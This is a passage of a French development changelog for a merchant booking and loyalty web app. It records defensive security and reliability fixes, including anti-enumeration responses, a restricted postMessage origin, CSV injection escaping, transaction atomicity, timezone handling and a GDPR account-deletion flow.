  de timing ~300ms révélait l'existence du compte. Fix : message unifié
  `'Email ou mot de passe incorrect.'` + `bcrypt.compare` systématique contre
  un hash bcrypt dummy (`DUMMY_BCRYPT`, 12 rounds, généré au boot) quand
  l'email n'existe pas → temps constant.

- **Énumération email `/forgot`** : retournait `404 'Aucun compte avec cet
  email.'` si inconnu. Alignement avec `/pin-forgot-request` : toujours
  renvoyer `ok:true` (+ validation regex email stricte). Un attaquant ne peut
  plus sonder quels emails ont un compte commerçant.

- **Validation email faible** : `/change-email` n'utilisait que
  `.includes('@')` → acceptait `a@b@c`, `@x`, etc. `/register`, `/login`,
  `/forgot`, `/pin-forgot-request` ne validaient rien. Fix : helper partagé
  `isValidEmail()` (même regex RFC5322-lite que clients/global-clients/
  referrals, cap 254 chars RFC 5321).

- **`postMessage('*', token)` dans les 2 callbacks Google OAuth** : la page
  de succès envoie le JWT au `window.opener` avec origine cible `'*'` → tout
  opener (y compris une page attaquante qui aurait `window.open` la popup)
  pouvait lire le token via un listener `message`. Fix : origine cible
  restreinte à `FRONTEND_URL` (injectée côté serveur dans le HTML). Impact
  critique : vol de JWT commerçant + JWT client via Google sign-in.

- **`code.trim()` sur `undefined`** : 5 handlers OTP (`/register/confirm`,
  `/forgot/verify`, `/forgot/reset`, `/change-email/confirm`,
  `/pin-forgot-verify`) crashaient en 500 si le champ `code` était absent
  (DoS trivial + fuite stack via `e.message`). Fix : guard `code?.trim()` en
  début de handler.

- **`/pin-lockout-notify` relai à spam** : endpoint non authentifié qui
  envoyait un email d'alerte à n'importe quelle adresse fournie dans le body
  → vecteur de spam/phishing via l'infra SMTP du commerçant (expéditeur
  légitime). Fix : vérif que l'email existe en BDD avant envoi + regex
  stricte ; réponse uniforme `ok:true` anti-énumération.

- **Error hygiene** : 4 handlers renvoyaient `e.message` au client
  (`DELETE /account`, `GET /me`, `POST /change-password`, `PUT /profile`) →
  fuite potentielle du schéma PG (nom de colonne, constraint). Fix :
  `'Erreur serveur.'` + log côté serveur (aligné K/L/M).

### Non corrigé (hors scope surgical)
- Password complexity (min 6 chars) : choix produit, pas une vulnérabilité.
- Rate-limit PIN `/pin/verify` : couvert au niveau middleware Express.
- `resend-code` signale `SESSION_EXPIRED` si pas de registration en cours :
  révèle seulement les comptes en cours d'inscription, pas les comptes
  existants ; fenêtre de 15 min ; impact limité.

### Commit
- `9199a07` audit(auth) N: anti-enumeration + strict email + postMessage origin

---

## Session 2026-04-20 (suite 24) : Hotfix prod + Audit ÉCONOMIQUE — K, L, M

### 🔥 Hotfix prod (`3d35622`)
Crash Render en boucle depuis le commit D (booking.js):
```
ReferenceError: Cannot access 'employeePinOptional' before initialization
  at booking.js:60 (router.use before require)
```
`const` bindings sont hoistés mais en TDZ jusqu'à leur déclaration. Le
`router.use(employeePinOptional)` ligne 60 appelait la référence avant
que le `require` ligne 65 ne l'initialise → chaque worker mourrait au
boot → port jamais bindé → deploy timeout Render.

Fix : déplacement de tous les `require()` en haut du fichier (idiome
Node standard), au-dessus des `router.use()`. Zéro changement
comportemental.

### Audit domaine économique/fraude (loyalty / promo / referrals / credits)
13 bugs bruts détectés par agent, 9 retenus + 4 faux positifs écartés :
- Montants négatifs credits.grant : déjà rejetés par `parseFloat(amount) <= 0`.
- UPSERT `stamps=stamps+1` race : PG ON CONFLICT DO UPDATE est atomique
  via row lock implicite. Pas de perte de mise à jour.
- Auto-parrainage : le check `self_referral` ligne 453 existait déjà.
- LEFT JOIN promo_codes user_id leak : les promos sont scoped par user_id
  dans le WHERE principal, pas de fuite cross-merchant.

### Commit K (`9d6f6a7`) — Input validation promo
**Fichier** : `backend/src/routes/promo.js`

- **Helper `validatePromoInput()`** partagé POST + PUT : value ≥ 0,
  percent ≤ 100, fixed ≤ 10000€, max_uses ≥ 1 si fourni.
- Avant : `value=-10` accepté → discount négatif = surcoût appliqué
  au client. `value=150%` accepté (capé au runtime par Math.min, mais
  UX trompeuse).
- **PUT /:id** : ajout du check `type in {percent,fixed}` manquant —
  un PUT pouvait changer le type vers n'importe quoi.
- `e.message` → `'Erreur serveur.'` sur les 7 handlers.

### Commit L (`177a285`) — Credits atomicity + FOR UPDATE + TZ-aware date
**Fichier** : `backend/src/routes/credits.js`

- **POST /grant** : `UPDATE balance` + `INSERT credit_transactions` wrap
  dans BEGIN/COMMIT via `pool.connect()`. Avant, un crash entre les 2
  laissait le solde mis à jour sans historique (ou inverse).
- **POST /repay** (critique : impact financier direct) : 3 opérations
  (INSERT transaction caisse + UPDATE balance + INSERT credit_tx)
  désormais atomiques. Avant : crash après le tx caisse mais avant
  le débit du crédit → client payait + solde inchangé = double
  réclamation possible.
- **SELECT FOR UPDATE** sur `client_credits` dans /repay pour
  sérialiser deux remboursements concurrents du même crédit (sinon
  balance=-10 ou incohérence entre threads).
- **TZ-aware date/heure** : lecture de `booking_settings.timezone` +
  `NOW() AT TIME ZONE` pour dater la transaction caisse. Avant :
  `new Date()` UTC sur Render → tx faite à 23h30 Paris datée du
  lendemain.
- ROLLBACK sur toute erreur, `release()` garanti via `finally`.
- Messages génériques.

### Commit M (`d131173`) — Hygiène loyalty/referrals
**Fichiers** : `loyalty.js`, `referrals.js`

- **`e.message` → `'Erreur serveur.'`** (21 occurrences). Plus de fuite
  schéma PG au client.
- **`referrals.js:resolveReferralForFilleul`** : regex email durcie.
  Avant, `.includes('@')` laissait passer `a@b@c`, `@x`, etc.
  Remplacé par la même `EMAIL_RE` RFC5322-lite utilisée dans
  clients/global-clients + cap 254 chars (RFC 5321 SMTP).

### Bugs couverts
Critiques : atomicité credits/grant & credits/repay, TZ date. Majeurs :
validation value promo (négatif/overflow), max_uses, type PUT. Mineurs :
regex email referrals, hygiène messages erreur.

### Commits
- `3d35622` fix(prod): TDZ crash on booking.js require order
- `9d6f6a7` audit(promo) K: input validation + error message hygiene
- `177a285` audit(credits) L: atomicity + FOR UPDATE + TZ-aware date
- `d131173` audit(loyalty/referrals) M: error hygiene + strict email regex

### Reste à faire (dette reportée)
- **loyalty-utils.js** : race condition entre le UPSERT atomique et le
  reset `stamps -= threshold`. Si 2 RDV concurrents franchissent le
  seuil, 2 codes récompense peuvent être créés. Fix : advisory lock PG
  sur `(user_id, client_email)` ou wrap complet en transaction.
- **referrals.js** : race condition sur `uses_count` increment + INSERT
  referral_uses. FOR UPDATE sur referral_codes manquant.
- **promo_usage_logs / referral_uses** : RGPD — emails en clair, pas de
  cron d'anonymisation.

---

## Session 2026-04-20 (suite 23) : Audit CLIENTS / CRM — commits H, I, J

### Audit mené par agent (15 bugs bruts, 13 retenus + 2 faux positifs skip)
Faux positifs écartés : (a) reset-password "cross-tenant" → design intentionnel
(global_client est partagé entre merchants) ; (b) 404 vs 400 leak sur /invite
→ négligeable.

### Commit H (`8ca1009`) — Auth/info-leak hardening
**Fichiers** : `backend/src/routes/clients.js`, `backend/src/routes/global-clients.js`

- **GET /clients/:id** : `password_hash` retiré du SELECT. Avant, le bcrypt du
  client remontait dans le JSON côté front → exposition inutile.
- **POST /clients/:id/invite** : refuse si un `global_client` vérifié existe
  déjà pour cet email. Avant, le `ON CONFLICT (email) DO UPDATE` écrasait
  l'`invite_token` d'un compte vérifié chez un autre merchant → vecteur de
  spam d'invitations à des clients d'autres prestataires. Ajout clause
  `WHERE is_verified=FALSE` dans le DO UPDATE pour ceinture+bretelles.
- **Helper `isValidEmail()`** (regex RFC5322-lite, ≤254 chars) partagé sur
  `/register` global-clients, POST `/clients`, POST `/clients/:id/invite`.
- **`isRealDate()`** : rejette 2024-02-31 et dates impossibles qui passaient
  la regex YYYY-MM-DD dans `/register`.
- **Timing-attack forgot-password** : plancher 400ms dans toutes les branches.
  Avant, email inexistant répondait <5ms / email existant ~300ms (saveCode +
  SMTP) → énumération de comptes via latence HTTP.
- **Messages génériques** sur forgot-password et reset-password.

### Commit I (`92cba90`) — RGPD delete atomicity + anonymisation scopée
**Fichier** : `backend/src/routes/global-clients.js`

- **DELETE /api/global-clients/me** entièrement enveloppé en `BEGIN/COMMIT`
  via `pool.connect()`. 9 opérations sur 6 tables : sans transaction, un
  échec à mi-parcours (timeout, deadlock) laissait un état incohérent
  (fiches locales supprimées mais compte global encore actif, ou inverse).
  `ROLLBACK` sur toute erreur, `release()` garanti via `finally`.
- **Annulation RDV futurs scopée** aux ids retournés par l'UPDATE
  d'anonymisation (via `RETURNING id` puis `WHERE id = ANY($1::uuid[])`).
  Avant : `WHERE client_id IS NULL AND client_name='Client anonyme'`
  annulait aussi les RDV d'anciennes suppressions RGPD → cascade non
  voulue entre comptes sans rapport.
- **Anonymisation fusionnée** (1 UPDATE au lieu de 2) : match par
  `global_client_id` OU `client_email` dans la même requête.
- Messages génériques.

### Commit J (`e309b57`) — Input validation + error message hygiene
**Fichiers** : `clients.js`, `client-notes.js`, `birthday.js`

- **GET /clients** : pagination cap `limit ∈ [1..200]` + fallback NaN → 100.
  Avant : `?limit=9999999` → OOM sur gros merchants.
- **PUT /clients/:id (interne)** : validation email + **lowercase**
  normalisation avant UPDATE. Tous les SELECT/JOIN sur `client_accounts.email`
  utilisent `LOWER(email)=...` → un email mixed-case devenait introuvable
  (loyalty, notes, transactions décorrélés).
- **note_text cap 5000 chars** dans POST `/clients/:id/note` et POST/PUT
  `/client-notes` (DoS disque + UX).
- **birthday PUT /** : cap `discount_value` percent ≤ 100 et fixed ≤ 10000€.
  Avant, 150% acceptée → bug applicatif en aval dans le calcul de remise.
- **Concat nom plus robuste** dans POST `/:id/note` : `NULL last_name`
  n'insère plus "John null".
- **`res.json({error: e.message})` → `'Erreur serveur.'`** partout
  (clients.js 9 occurrences, client-notes.js 4, birthday.js 2) + ajout
  `console.error` pour tracer.

### Bugs couverts (13/13 retenus traités)
Critiques : timing forgot-password, fuite password_hash, abus invitation
cross-merchant, DELETE /me non-atomique, anonymisation RGPD trop large.
Majeurs : regex email, validation birth_date réelle, pagination cap,
discount percent cap. Mineurs : email lowercase PUT, note cap, hygiène
messages erreur.

### Commits
- `8ca1009` audit(clients/CRM) H: auth/info-leak hardening
- `92cba90` audit(clients/CRM) I: RGPD delete atomicity + scoped anonymisation
- `e309b57` audit(clients/CRM) J: input validation + error message hygiene

---

## Session 2026-04-20 (suite 22) : Audit STATS + EXPORT — commits E, F, G

### Audit mené par agent (18 bugs trouvés)
5 critiques + 7 majeurs + 6 mineurs. Traités dans 3 commits.

### Commit E (`7e73c62`) — CSV/export hardening
**Fichier** : `backend/src/routes/export.js`

- **`escCsv()`** refait : gère `;` (sep CSV FR, Excel), formula injection Excel
  (préfixe `'` si champ commence par `= + - @ \t \r`), retours chariot.
- **Double escape supprimé** : `categorie`/`employe`/`description` passaient
  2× dans `escCsv` → guillemets quadruplés, champs illisibles.
- **`pinAdminMiddleware` sur `/csv` et `/pdf`** : l'export financier complet est
  désormais gated derrière le PIN admin (auparavant JWT merchant suffisait →
  session volée = dump compta complète). `/summary` reste sans PIN (preview).
- **Validation stricte** : `from`/`to` (regex YYYY-MM-DD), `employee_id`/
  `category_id` (regex UUID), `type ∈ {all,revenue,expense}`. Plage max 2 ans
  (DoS mémoire PDFKit).
- **GROUP BY e.id** au lieu de `e.name` → plus de fusion d'employés homonymes.
- **`/summary`** : `total_tx_revenue` / `total_tx_expense` séparés (avant, un
  `total_tx` global mélangeait recettes+dépenses → KPI incohérent).
- **Error messages génériques** : plus de `e.message` PG fuit dans la réponse.

### Commit F+G (`4268f7b`) — Stats TZ + cache invalidation
**Fichiers** : `backend/src/routes/stats.js`, `backend/src/routes/transactions.js`

- **Validation input stats** : `from`/`to` + `employee_id` (même regex).
- **`/today` TZ-aware** via helper `merchantToday(userId)` qui requête
  `NOW() AT TIME ZONE COALESCE(booking_settings.timezone, 'Europe/Paris')`.
  Avant : serveur Render UTC → à 23h Paris le dashboard basculait au lendemain
  (CA = 0€ affiché alors que le merchant vendait encore).
- **`/forecast` borne TZ-aware** + **combler mois manquants avec 0** : si un
  merchant saute un mois, la régression linéaire traitait `nov` comme `index+1
  de sept` → prévision faussée. Corrigé.
- **Error messages génériques** sur toutes les routes stats.
- **`invalidateStatsCache(userId)`** dans `transactions.js` : appelé après
  POST/PUT/DELETE d'une transaction. Invalide les clés
  `stats:products|today|forecast|heatmap:${userId}`. Avant : décalage 2-10 min
  entre vente et dashboard.

### Reste à faire (optionnel, mineur)
- Bug #8 : SUM(qty_total NULL) pour anciennes lignes pré-migration (à
  surveiller, impact nul si migration appliquée).
- Bug #18 : incohérence point/virgule dans libellé multi-paiement CSV.

### Bugs couverts (18/18 bloquants traités)
Critiques 1,3,4,5,9,10 : commit E. Majeurs 6,7,11,12,17 : commits E+F+G.
Cache (2) : commit G.

### Commits
- `7e73c62` audit(export) E: CSV hardening + pinAdmin on /csv /pdf
- `4268f7b` audit(stats) F+G: TZ-aware dates + input validation + cache invalidation

---

## Session 2026-04-19 (suite 21) : Commit D — Timezone-aware booking (DST + serveur UTC)

### Problèmes visés (audit booking)
- **#6** `getSlots` utilisait `new Date().toLocaleDateString('sv-SE')` / `getHours()` → heure
  serveur Render (UTC) et non l'heure du commerçant → décalage d'1-2h sur l'affichage du
  nowMin (créneaux passés encore visibles ou créneaux actuels masqués).
- **#7** POST `/book` comparaison `new Date(apptDt) < new Date(Date.now() + h*3600000)` →
  DST non gérée proprement quand la période franchit un changement d'heure.
- **#24** Annulation client calculait `diffHours` en JS local sur le serveur UTC → pouvait
  refuser ou accepter à tort selon le décalage TZ.

### Approche
Utiliser PostgreSQL `AT TIME ZONE <merchant_tz>` partout où un `date+time` doit être comparé
à « maintenant » ou à un seuil relatif. PG gère DST nativement. Le champ
`booking_settings.timezone VARCHAR(50) DEFAULT 'Europe/Paris'` existait déjà en schéma.

### Fichier — `backend/src/routes/public-booking.js`

**`getSlots()`** (signature + body) : ajout param `timezone` (défaut `'Europe/Paris'`). Le
calcul de `todayStr`/`nowMin` passe par une requête PG unique :
```sql
SELECT TO_CHAR(NOW() AT TIME ZONE $1, 'YYYY-MM-DD') AS today,
       EXTRACT(HOUR FROM NOW() AT TIME ZONE $1)::int AS h,
       EXTRACT(MINUTE FROM NOW() AT TIME ZONE $1)::int AS mi
```

**GET `/:slug/slots`** : SELECT étendu avec `COALESCE(timezone, 'Europe/Paris')` → passé en
6e param à `getSlots`.

**GET `/:slug/month-status`** : idem, boucle interne passe `bizTz`.

**POST `/:slug/book`** : SELECT merchant étendu avec `timezone`. Les deux contrôles
min_notice et advance_booking_days fusionnés en une seule requête :
```sql
SELECT
  (($1::date + $2::time) AT TIME ZONE $3) < (NOW() + ($4 || ' hours')::interval) AS too_soon,
  $1::date > ((NOW() AT TIME ZONE $3)::date + ($5 || ' days')::interval)::date AS too_far
```
Suppression des `new Date(...)` locaux (apptDt/minDt/maxDt) devenus inutiles.
L'appel interne à `getSlots` passe aussi `bizTz`.

**PUT `/:slug/client/appointments/:id/cancel`** : SELECT biz ajoute `timezone`. `diffHours`
recalculé via `EXTRACT(EPOCH FROM (($1::date + $2::time) AT TIME ZONE $3 - NOW())) / 3600`.

### Effet
- Serveur Render (UTC) se comporte désormais comme si le calcul tournait sur le fuseau du
  commerçant pour tous les contrôles de réservation publique.
- DST (dimanche d'avril et octobre) géré nativement par PG → plus de créneaux fantômes le
  jour du changement d'heure.
- Merchant peut configurer sa TZ (Europe/Paris par défaut) → évolutif pour DOM-TOM ou
  expansion internationale.

### Rétro-compatibilité
Aucune migration (colonne existait déjà). `COALESCE` protège les settings historiques sans
valeur explicite. Signature `getSlots` rétro-compatible (param optionnel avec défaut).

### Sanity check
- `node --check src/routes/public-booking.js` : OK.

---

## Session 2026-04-19 (suite 20) : Modal suppression épurée + politique de confidentialité étoffée

### Demande (onboarding.md)
Retirer le gros paragraphe explicatif de la modal de suppression (« Vos
données personnelles… / Les transactions restent conservées de façon
anonyme… ») et déplacer cette explication dans la politique de
confidentialité — plus approprié et lisible.

### Frontend — `pages/booking/MyAppointments.jsx`
Paragraphe détaillé remplacé par une mention courte :
`Cette action est irréversible. Voir la politique de confidentialité.`
Le lien ouvre `/book/:slug/politique` dans un nouvel onglet (`target="_blank"`)
pour ne pas perdre le contexte de la modal.

### Frontend — `pages/BookingPolitique.jsx`
Nouvelle section **🗑️ Suppression de compte** ajoutée dans `SECTIONS` :
- Procédure : onglet Mon profil → « Supprimer mon compte » → confirmation
  saisie du mot « supprimer ».
- Effet sur données personnelles : nom/prénom/email/téléphone effacés
  définitivement + RDV futurs annulés automatiquement.
- Justification conservation transactions anonymisées :
  - Obligations comptables et fiscales du commerçant.
  - Seuls montants / dates / prestations conservés, sans lien avec l'identité.
  - Conformité RGPD (droit à l'effacement) ET respect des obligations légales
    de tenue des livres comptables.

La section s'insère juste après « 🔒 Données personnelles » (continuité
logique) et utilise le même format accordéon que les autres sections.

### Build
- `npx vite build` : OK (16.37s, 87 modules).
- `page-booking` : 164.07 kB (-0.02 kB, texte plus court dans la modal).
- `index` (qui contient BookingPolitique) : 191.26 kB (+~1 kB pour la
  nouvelle section).

### Compatibilité préservée
- Aucun changement d'API. La modal fonctionne toujours exactement pareil,
  juste avec un texte plus court et un lien sortant.
- Le lien vers `/book/:slug/politique` ouvre dans un nouvel onglet → la
  saisie en cours dans la modal n'est pas perdue si l'utilisateur consulte
  la politique.
- La section accordéon reste fermée par défaut → la longueur totale de la
  page de politique n'augmente pas visuellement à l'ouverture.

---

## Session 2026-04-19 (suite 19) : Fix 401 suppression compte + code "supprimer" insensible casse

### Bugs rapportés (onboarding.md)
1. `DELETE /api/global-clients/me` → 401 « Token invalide » quand le client
   est connecté via le site réservation commerçant.
2. Le mot de confirmation doit être « supprimer » (pas « SUPPRIMER4 »),
   **insensible à la casse** — majuscules ou minuscules acceptées.

### Cause racine bug 1
L'endpoint utilisait `globalClientAuth` qui n'accepte QUE `scope='global_client'`
(ff_gc_token). Or, après login sur un site commerçant, le front écrit
uniquement `ff_client_token` avec `scope='client'` + `globalClientId`.
Le fallback `gcRequest` envoyait bien le bon token, mais le middleware le
rejetait.

### Fix backend — `routes/global-clients.js`
Endpoint DELETE /me passe de `globalClientAuth` à `clientOrGlobalClientAuth`
(middleware déjà existant qui accepte les deux scopes, comme `/me/visits`
et les routes parrainage).

### Fix frontend — `pages/booking/MyAppointments.jsx`
- Constante `DELETE_PHRASE = 'supprimer'`.
- Nouveau helper `deleteConfirmOk = deleteConfirm.trim().toLowerCase() === DELETE_PHRASE`
  → comparaison insensible à la casse + trim auto des espaces.
- Bouton et handler utilisent `deleteConfirmOk` (plus de `!==` strict).
- Input `autoCapitalize='none'` (au lieu de 'characters') — n'impose plus
  les majuscules au clavier mobile.
- Message d'erreur : « Veuillez saisir « supprimer » pour confirmer. »
- Label affiché dans la modal : `supprimer` (minuscule) en rouge monospace.

### Build
- `node --check backend/src/routes/global-clients.js` : OK.
- `npx vite build` : OK (16.29s, 87 modules, page-booking stable 164.09 kB).

### Compatibilité préservée
- Le middleware `clientOrGlobalClientAuth` exige toujours un `globalClientId`
  valide dans le JWT → zéro risque d'accès non autorisé.
- Clients avec `ff_gc_token` (scope='global_client', ancien flow) continuent
  de fonctionner — le middleware accepte les deux scopes.
- Le test côté front était strict (`!== 'SUPPRIMER4'`) mais la sécurité
  réelle est côté backend (JWT) — assouplir la saisie n'introduit aucune
  faille : un attaquant devrait déjà avoir le token de session pour atteindre
  l'étape de confirmation.

---

## Session 2026-04-19 (suite 18) : Suppression compte client RGPD + confirmation "SUPPRIMER4"

### Demande (onboarding.md)
Ajouter bouton « Supprimer mon compte » sur la page profil client, sous
« Déconnexion ». Confirmation sécurisée : le client doit saisir exactement
`SUPPRIMER4` pour valider. Données personnelles supprimées (nom, prénom,
téléphone, email). Transactions conservées côté commerçant mais anonymisées.

### Backend (rien à ajouter)
L'endpoint `DELETE /api/global-clients/me` existait déjà (global-clients.js
lignes 766-858) avec la logique RGPD complète :
- Anonymise `appointments` (client_id=NULL, client_name='Client anonyme',
  client_email=NULL, client_phone=NULL) pour toutes les fiches liées ET
  toutes les lignes matchées par email.
- Annule les RDV futurs du compte supprimé (status='cancelled').
- Anonymise `transactions.client_email` et `client_note` (montant conservé
  pour la compta du commerçant).
- DELETE `client_accounts`, `client_loyalty`, anonymise `client_notes` et
  `client_credits`.
- DELETE `global_clients`.

### Frontend — `utils/api.js`
- Doublon supprimé : il y avait 2 définitions de `globalClientApi.deleteAccount`
  (une signature `(token)` et une sans argument qui écrasait la première).
  Conservé uniquement `deleteAccount: (token) => gcRequest('/global-clients/me',
  { method:'DELETE' }, token)`. Le fallback `gcRequest` utilise
  `ff_gc_token` puis `ff_client_token`, donc l'appel sans token fonctionne.

### Frontend — `pages/booking/MyAppointments.jsx`
- Nouveau state `deleteModal` / `deleteConfirm` / `deleteLoading` / `deleteErr`
  + constante `DELETE_PHRASE = 'SUPPRIMER4'`.
- Handlers `openDeleteModal` / `closeDeleteModal` / `doDeleteAccount`.
  `doDeleteAccount` vérifie l'égalité stricte avec `SUPPRIMER4`, appelle
  `globalClientApi.deleteAccount()`, purge localStorage (ff_gc_token,
  ff_client_token, ff_client_info), puis appelle `onLogout()` ou `onBack()`.
- Bouton « Supprimer mon compte » rendu sous « Se déconnecter » dans l'onglet
  Profil (activeTab === 'profile'). Style discret : border neutre, texte gris,
  icône corbeille — pour ne pas encourager la suppression mais rester découvrable.
- Modal RGPD : icône triangle alerte rouge, message d'avertissement
  (« irréversible » + explication sur la conservation anonyme des
  transactions), label `SUPPRIMER4` affiché en rouge gras monospace, input
  dédié avec `autoCapitalize='characters'` + `spellCheck=false`, bouton rouge
  « Supprimer définitivement » désactivé tant que le texte saisi ≠ `SUPPRIMER4`.

### Parcours utilisateur
1. Client connecté ouvre « Mes RDV » → onglet « Mon profil ».
2. Scroll en bas → boutons « Se déconnecter » puis « Supprimer mon compte ».
3. Clic → modal avec champ de saisie. Tant que `SUPPRIMER4` n'est pas saisi
   à l'identique, le bouton « Supprimer définitivement » reste gris/disabled.
4. Validation → DELETE /me exécuté → localStorage nettoyé → retour à l'accueil
   du site de réservation (onLogout/onBack).

### Build
- `npx vite build` : OK (13.30s, 87 modules).
- `page-booking` : 164.09 kB (+~3.8 kB pour le nouveau modal + handlers).

### Compatibilité préservée
- Zéro migration DB (endpoint backend déjà déployé depuis longtemps).
- Bouton visible uniquement dans l'onglet 'profile' (activeTab === 'profile')
  → aucun impact sur les autres vues (booking / visits / parrain).
- Le modal est rendu conditionnellement en fin de return, comme `cancelModal`
  et `tooLateModal` existants → même stack d'overlays, zIndex 200.
- Input avec `autoCapitalize='characters'` : sur mobile iOS/Android, le
  clavier propose directement les majuscules (réduit les erreurs de saisie).
- La vérification `!== DELETE_PHRASE` est stricte (sensible à la casse et aux
  espaces) — conforme à la demande « exactement SUPPRIMER4 ».

---

## Session 2026-04-19 (suite 17) : Traçabilité passages sur place cross-commerçant

### Demande (onboarding.md)
Tracer les passages « sur place » des clients : quand un employé d'un
commerçant encaisse et identifie un client dans une transaction (sans RDV
préalable), ce passage doit apparaître sur le compte client connecté avec
le détail (commerçant, date, heure, prestations, prix). UI responsive,
cross-commerçant (visible pour tous les commerçants où le client est passé).

### Backend — Schéma DB (`db/index.js`)
Nouvelle colonne + index idempotents (ligne 608-609) :
```sql
ALTER TABLE transactions ADD COLUMN IF NOT EXISTS global_client_id UUID
  REFERENCES global_clients(id) ON DELETE SET NULL;
CREATE INDEX IF NOT EXISTS idx_transactions_global_client
  ON transactions(global_client_id) WHERE global_client_id IS NOT NULL;
```
Le `ON DELETE SET NULL` garantit que la suppression d'un global_client
(option RGPD) ne supprime pas les transactions historiques du commerçant.

### Backend — Lookup automatique global_client_id

**`routes/transactions.js` POST /** :
- Avant l'INSERT, si `client_email` est fourni, recherche `global_clients.id`
  par email (LOWER). Stocké dans la nouvelle colonne.
- Si le client n'a pas de compte global (jamais inscrit sur un site
  réservation), `global_client_id` = NULL. La transaction reste créée mais
  ne sera pas visible dans « Mes passages ». Si plus tard le client crée
  un compte global avec ce même email, les futures transactions seront
  liées (pas les anciennes — c'est volontaire, respect du consentement).

**`routes/booking.js` POST /appointments/:id/checkout** :
- Même lookup depuis `appt.client_email`. La transaction RDV est liée au
  global_client si dispo (permet traçabilité uniforme, même si affichée
  dans « Mes RDV » pas « Passages »).
- Ajout des colonnes `client_email` et `global_client_id` à l'INSERT.

### Backend — Nouveau endpoint `GET /me/visits`
`routes/global-clients.js` (après `/appointments`) :
- Auth : `globalClientAuth` (JWT scope='global_client').
- Filtre : `t.appointment_id IS NULL` (exclut les encaissements RDV) +
  `t.type IN ('income','revenue')` (exclut les dépenses) +
  `(global_client_id = $gcId OR LOWER(client_email) = LOWER($email))`.
  Le double critère OR supporte les anciennes transactions où le lookup
  n'existait pas, via fallback sur l'email du compte global.
- JOIN `booking_settings` pour `business_name` + `slug`, `users` pour
  phone/adresse, `employees` pour le nom de l'employé qui a encaissé.
- Charge les `transaction_items` en 1 round-trip via `ANY($1::uuid[])`.
- Retourne : id, business_name, slug, date, time, amount, original_amount,
  discount_amount, payment_method, employee_name, items[] {service_name, qty, unit_price}.
- Limite 200 par défaut (suffisant, pas de pagination pour l'instant).

### Frontend — API (`utils/api.js`)
```js
globalClientApi.myVisits: (token) =>
  gcRequest('/global-clients/me/visits', {}, token),
```
Utilise le fallback `ff_gc_token` → `ff_client_token` déjà en place dans
`gcRequest` (session 10).

### Frontend — `MyAppointments.jsx`
- Nouveau state `visits` / `visitsLoading` / `visitsLoaded`.
- `useEffect` lazy : charge `globalClientApi.myVisits()` la première fois
  que l'onglet 'visits' devient actif (pas au mount pour économiser un
  appel réseau si l'utilisateur consulte seulement « Mes RDV »).
- Nouvel onglet `visits` ajouté **entre** « Mes RDV » et « Mon profil »
  dans la barre des tabs principaux. Icône GPS pin.
- Rendu du tab 'visits' :
  - Loading → Spinner.
  - Empty state → pin 48px gris + message explicatif « Quand un commerçant
    vous encaisse en caisse sans RDV préalable, la trace apparaît ici… ».
  - Liste de cards (même style visuel que les cards RDV) :
    - Badge violet « 📍 Passage sur place »
    - Nom du commerçant (gros titre)
    - Date long format (« Lun. 14 avr. 2026 ») + heure
    - Montant vert gros (avec prix barré si remise appliquée)
    - Liste des prestations : nom + quantité (×N) + prix unitaire × qté
    - Footer : « Avec {employé} » + badge méthode de paiement
  - Responsive : `flexWrap:'wrap'` sur le footer, `minWidth:0` +
    `textOverflow:'ellipsis'` sur les textes longs (business_name, items).

### Parcours utilisateur corrigé (scénarios)

**Scénario A — Client inscrit passe en caisse chez Commerçant X :**
1. Employé ouvre la caisse, saisit les items, entre l'email du client.
2. POST /api/transactions avec `client_email='alice@mail.com'`.
3. Backend lookup `global_clients` → trouvé, stocke `global_client_id`.
4. Transaction créée avec lien global.
5. Alice se connecte sur n'importe quel site réservation → ouvre « Mes RDV »
   → clique onglet « Sur place » → voit le passage chez Commerçant X
   avec détails complets.

**Scénario B — Client inscrit chez 3 commerçants différents :**
- Même global_client_id pour les 3 → 3 passages affichés dans le même tab,
  chacun avec le bon business_name grâce au JOIN booking_settings.

**Scénario C — Client passe en caisse SANS compte global :**
- Le lookup échoue, `global_client_id` reste NULL.
- Si plus tard le client crée un compte avec cet email, **les anciennes
  transactions NE sont PAS rétroactivement liées** (par choix, pour éviter
  de lier un email partagé à un mauvais compte).
- Seules les nouvelles transactions post-inscription sont tracées.

### Build
- `node --check` × 4 backend : OK.
- `npx vite build` : OK (17.83s, 87 modules).
- `page-booking` : +4.5 kB (155.82 → 160.32) pour le nouveau tab + carte
  visite + fetch lazy.

### Compatibilité préservée
- Migration `ADD COLUMN IF NOT EXISTS` + `CREATE INDEX IF NOT EXISTS` → idempotent.
- Anciennes transactions : `global_client_id` = NULL (pas de backfill).
  Fallback via `client_email` dans la requête `/me/visits` → les passages
  antérieurs avec email correspondant restent visibles au client.
- Aucun changement sur la caisse (App.jsx) — le flux d'encaissement est
  identique. Le lookup est fait silencieusement côté backend.
- La vue agenda/transactions du commerçant n'est pas modifiée (la
  nouvelle colonne n'est pas exposée côté API merchant pour l'instant).
- Si le client n'est pas connecté avec un compte global, l'onglet
  « Sur place » reste vide (endpoint auth protégé → 401).

---

## Session 2026-04-19 (suite 16) : Fix styles NavBar cassés sur Mes RDV + tabs scrollables

### Bug rapporté
Click sur la card « Mes rendez-vous » du drawer → la page s'ouvre mais le
design est cassé : le bouton hamburger disparaît, les 3 liens rapides aussi,
et on ne voit plus que les tabs « Profil » et « Mes RDV ».

### Cause racine
La balise `<style>` globale de BookingPage contenait les règles CSS
responsive de la NavBar (`.bk-do`, `.bk-do-right`, `.bk-mo-quick`,
`.bk-mo-hamb`, `.bk-drawer*`, `.bk-nav-title`, etc.) ET cette balise n'est
rendue QUE dans la vue 'booking'. Sur la vue 'myAppts', 'parrain' ou
'success', la balise `<style>` n'était pas injectée → les règles responsive
NavBar ne s'appliquaient PAS → la NavBar revenait à son comportement
« desktop » forcé avec zone droite `display:flex` invisible (car contenu
trop large), pas de hamburger (`display:none` par défaut), pas de liens
rapides (`display:none` par défaut).

### Fix — auto-porteur des styles NavBar
Les règles CSS responsive de la NavBar et du drawer sont déplacées de
`BookingPage.jsx` vers une balise `<style>` **à l'intérieur du composant
`NavBar` lui-même**. Ainsi :
- Chaque fois que `NavBar` est monté (toute vue de la page réservation),
  ses styles sont injectés dans le DOM.
- Plus de dépendance entre la vue active et les styles NavBar.
- React de-duplique naturellement via son render tree (même balise
  `<style>` répétée = même effet CSS, pas de problème).

### Règles déplacées vers NavBar.jsx
- `.bk-do-right`, `.bk-do`, `.bk-mo`, `.bk-mo-quick`, `.bk-mo-hamb`
- `.bk-nav-pad`, `.bk-nav-title`
- `.bk-drawer`, `.bk-drawer-backdrop`, `.bk-drawer-panel`

